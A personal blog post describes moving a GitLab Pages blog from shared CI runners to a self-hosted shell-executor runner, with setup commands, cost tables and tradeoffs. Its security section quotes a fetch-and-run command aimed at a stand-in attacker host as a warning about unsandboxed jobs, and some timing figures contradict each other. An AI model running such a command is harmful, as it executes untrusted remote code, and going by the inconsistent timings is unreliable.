Title: How I Stopped Burning GitLab's 400-Minute Quota — A Self-Hosted Runner on My Own Box
Date: 2026-07-02
Tags: gitlab, ci-cd, devops, self-hosted-runner, dogfood, infrastructure, learning-in-public
Description: GitLab's free tier is 400 CI minutes a month — fine for occasional commits, hostile if you post daily. I swapped the shared runner for a self-hosted one on my own machine. The quota became irrelevant. This post is the first publish through the new pipeline.
---

```d2
direction: right

title: "Shared Runner vs Self-Hosted Runner" {
  shape: text
  near: top-center
  style: {font-size: 26}
}

Before: "BEFORE — GitLab Shared Runner" {
  style.fill: "#FFEBEE"
  style.stroke: "#E53935"
  style.stroke-width: 2

  pushB: "git push" {shape: cloud}
  glB: "GitLab.com" {
    queueB: "Pipeline Queue" {shape: rectangle}
    sharedB: "Shared Runner\n(GitLab-managed)" {
      style.fill: "#FFCDD2"
    }
  }
  capB: "400 min/mo\nQUOTA" {
    style.fill: "#FFCDD2"
    style.font-color: "#E53935"
    style.stroke: "#E53935"
  }
  pagesB: "GitLab Pages" {
    style.fill: "#C8E6C9"
    shape: hexagon
  }

  pushB -> glB.queueB
  glB.queueB -> glB.sharedB
  glB.sharedB <-> capB: "debited"
  glB.sharedB -> pagesB: "uploads"
}

After: "AFTER — Self-Hosted Runner on My Box" {
  style.fill: "#E8F5E9"
  style.stroke: "#43A047"
  style.stroke-width: 2

  pushA: "git push" {shape: cloud}
  glA: "GitLab.com" {
    queueA: "Pipeline Queue\n(tag: homepage)" {shape: rectangle}
  }
  laptop: "My Machine" {
    shape: cloud
    style.fill: "#E8F5E9"
    runnerA: "gitlab-runner\n(shell executor)" {
      style.fill: "#C8E6C9"
      shape: hexagon
    }
    tools: "bb, pandoc, d2" {shape: cylinder}
    unlimited: "0 min quota" {
      style.fill: "#C8E6C9"
      style.font-color: "#43A047"
    }
  }
  pagesA: "GitLab Pages" {
    style.fill: "#C8E6C9"
    shape: hexagon
  }

  pushA -> glA.queueA
  glA.queueA -> laptop.runnerA: "pulls job"
  laptop.runnerA -> laptop.tools
  laptop.runnerA <-> laptop.unlimited
  laptop.runnerA -> pagesA: "uploads"
}
```

Three blog posts in one day and I was about to bump into GitLab's free-tier CI quota. Not a hypothetical: I shipped [19 commits yesterday](https://gitlab.com/nurazhar/homepage/-/commits/main) — eleven new posts, a CI image refactor, and a homepage fix — and watched the shared-runner counter tick up each time.

Then the pipeline started failing entirely. My [Dockerfile](https://gitlab.com/nurazhar/homepage/-/blob/main/Dockerfile) pinned `ARG BB_VERSION=1.12.218` — that release had been quietly removed from GitHub, so every push 404'd at the babashka download step. The `pages` job was being skipped. The site wasn't deploying through the old flow at all.

So I had two problems. One I caused (stale version pin). One I didn't (400-min cap on shared runners). Same solution for both: stop borrowing compute from GitLab.

## The Realization

The instinct is to defend the quota: bigger account, paid tier, fewer commits. But GitLab's docs say it plainly — **the 400-minute cap applies only to GitLab-managed shared runners**. Self-hosted (custom) runners are explicitly exempt — your hardware, your minutes, no counter.

| Runner type | Counts against 400 min cap? | Free? | You operate it? |
|---|---|---|---|
| **Shared (instance) runner** | ✅ Yes | Up to 400 min/mo | No — GitLab does |
| **Group runner** | ✅ Yes | Up to 400 min/mo | No — GitLab does |
| **Self-hosted runner** | ❌ **No** | Always free | ✅ Yes |

That's the entire insight. The cost is not platform-level — it's *who owns the CPU*.

## What Changed

Same `pages` job, identical artifact, GitLab Pages unchanged. Only difference: the executor is **my box** instead of GitLab's box. And since GitLab's quota model only taxes *GitLab's* box, I'm in the clear. The hero diagram above already shows the topology — no second pass needed.

## Cost Math

| Plan | Capacity | Cost | Per-publish cost |
|---|---|---|---|
| GitLab Free + shared runner | 400 min/mo | $0 | ~1 min/push → 400-publish ceiling |
| GitLab Free + self-hosted | Unlimited | $0 | One laptop-fan's worth of electricity |
| GitLab Premium (10k min) | 10,000 min/mo | $29/user/mo | Bounded |

If you publish weekly, 400 minutes is plenty. If you publish daily or debug through CI, it bites. Self-hosting beats paying — same tier, $0 against quota.

## The Simplification Bonus

The old pipeline ran a `docker-build` stage first — it baked an `eclipse-temurin:25-jre-alpine` image with `babashka`, `pandoc`, and `d2` pre-installed, pushed it to the project container registry, then the `pages` job pulled the SHA-pinned image just to call `bb build`.

That image was the *reason* we even needed CI in the first place. On my own host, every one of those tools is already installed. So:

- ✅ `Dockerfile` deleted
- ✅ Container registry push deleted
- ✅ `docker-build` stage deleted
- ✅ Runner switched from `docker` executor to `shell` executor
- ✅ Build directly: `bb build && bb validate-links`
- ✅ Pipeline drops from ~45s (broken DinD + image pull) to ~78s warm (`bb build` + `bb validate-links` measured locally on the host; ~88s end-to-end once GitLab runner handshake, checkout, and artifact upload are included)

That's not just "faster" — it's an entire artifact of infrastructure erased because the constraint that justified it (*"we need a portable CI image"*) no longer applies when the CI literally *is* my portable image.

## Concrete Steps (Linux/Mac)

1. Install the runner binary. No root needed — `~/.local/bin/` works:
   ```bash
   curl -L "https://gitlab-runner-downloads.s3.amazonaws.com/v17.11.0/binaries/gitlab-runner-linux-amd64" \
        -o ~/.local/bin/gitlab-runner
   chmod +x ~/.local/bin/gitlab-runner
   ```
2. Get a project runner registration token from **Settings → CI/CD → Runners** in your GitLab project (or via the API: `glab api projects/<namespace%2F<project>` → `runners_token`).
3. Register with a tag — the tag routes jobs explicitly to this runner:
   ```bash
   ~/.local/bin/gitlab-runner register --non-interactive \
     --config ~/.config/gitlab-runner/config.toml \
     --url "https://gitlab.com/" \
     --registration-token "$TOKEN" \
     --executor "shell" \
     --description "homepage-self-hosted" \
     --tag-list "homepage-self-hosted" \
     --run-untagged=false
   ```
4. Run it, headless:
   ```bash
   setsid ~/.local/bin/gitlab-runner run \
     --config ~/.config/gitlab-runner/config.toml \
     > ~/.local/var/gitlab-runner.log 2>&1 < /dev/null &
   ```
5. Tag your `pages` job. In `.gitlab-ci.yml`, add `tags: [homepage-self-hosted]`. The shared runner never sees the job.

For a 24/7 install, drop step 4 into a `systemd --user` unit, a small VPS, or a Raspberry Pi. For a personal blog, a long-running notebook runner is enough.

## The Dogfood Publish

This post is **the first** one to go through the new pipeline. The runner was registered a few minutes before this commit. The `tag-list = "homepage-self-hosted"` matches the `tags: [homepage-self-hosted]` on my `pages` job and nothing else — so GitLab routes the build straight to my box. No shared-runner counter touched.

Full flow:

1. Install + register runner (5 min)
2. Simplify `.gitlab-ci.yml`: tag on `pages`, drop `docker-build`
3. Write this post and the hero diagram
4. `bb build && bb validate-links` locally — sanity check
5. `git add -A && git commit && git push origin main`
6. Local runner picks up the `pages` job (~10s)
7. Pipeline uploads `public/` → Pages publishes → nurazhar.com updated
8. **Zero shared-runner minutes consumed**

Honest aside: if my shell dies, the runner dies. For a blog — fine. For a team — systemd or a VPS.

## What This Proves on a CV

- **CI/CD ownership.** Didn't just *use* the platform — reshaped its execution boundary. Junior writes "ran CI." Senior writes "re-architected the executor topology to bypass a recurring quota, deleted an unnecessary artifact layer, and verified the change dogfood-style."
- **Cost-aware engineering.** $0 saved vs $29/mo billed = clear win. Documented it (this post) so the next engineer doesn't burn the same hours.
- **Architecture simplified, not just ported.** Deleted the Dockerfile, deleted the registry push, deleted a stage. The "I removed more than I added" line lands on a CV.
- **Dogfooding & learning in public.** Wrote the tutorial while the change was happening, not after sanitisation. Honest version, broken bits included.
- **Tool-free repair.** Replaced one tool-free service with another tool-free service. No paid vendor switch, no migration weekend, no new hire. Just relocated the CPU.

## The Honest Tradeoffs

Self-hosting is great. It is not free:

- **Single point of failure.** Laptop asleep → no deploys. For a blog, fine. For a team, run a small VPS or a Raspberry Pi.
- **Security.** Your machine now runs arbitrary CI code from your repo. If a branch ever ships `curl evil.com | sh`, it executes *on your laptop*. The `docker` executor is a sandbox; the `shell` executor is not. Use `docker` executor + DinD for untrusted inputs.
- **Maintenance.** OS patches, runner upgrades, cert rotation — those are now yours.
- **Network.** The runner needs to poll GitLab. Behind most home NATs that works.

| Dimension | Shared runner | Self-hosted runner |
|---|---|---|
| **Quota cost** | Burns 400 min cap | $0 against quota |
| **Speed (warm)** | ~45s (DinD boot + image pull) | ~78s (`bb build` + `bb validate-links` natively) |
| **Job sandboxing** | Yes (ephemeral container) | Limited on `shell` |
| **Maintenance** | None (GitLab owns it) | Yours |
| **Best for** | Teams, multi-person projects, security-sensitive inputs | Solo devs, daily pushing, low-risk builds |

If you're a team, pay GitLab or use group runners. If you're a solo dev who publishes often, this is the cheapest DevOps upgrade you'll make this year.

## The Algorithm

1. Note shared-runner usage.
2. Check whether it bites.
3. If yes, register a self-hosted runner with a tag.
4. Tag the `pages` job with the same tag.
5. Watch the pipeline run on your own machine. Watch the quota stay at 0.

That's it. No platform migration, no new vendor, no monthly bill. Just relocate the CPU.

## What I'd Add in Production

For a team setup I'd tighten three things:

- **`docker` executor** instead of `shell` — same speed, real per-job sandbox.
- **`systemd --user` unit** on the runner host — survives reboots, scoped to my user.
- **`glab ci lint`** before commit — catches YAML syntax bugs in seconds.

None of those are blockers for the publish today.

## One-Liner

The cheapest DevOps upgrade you'll make this year is moving the CI executor from GitLab's box to your own — same Pages, same artifact, zero shared-runner minutes burned.
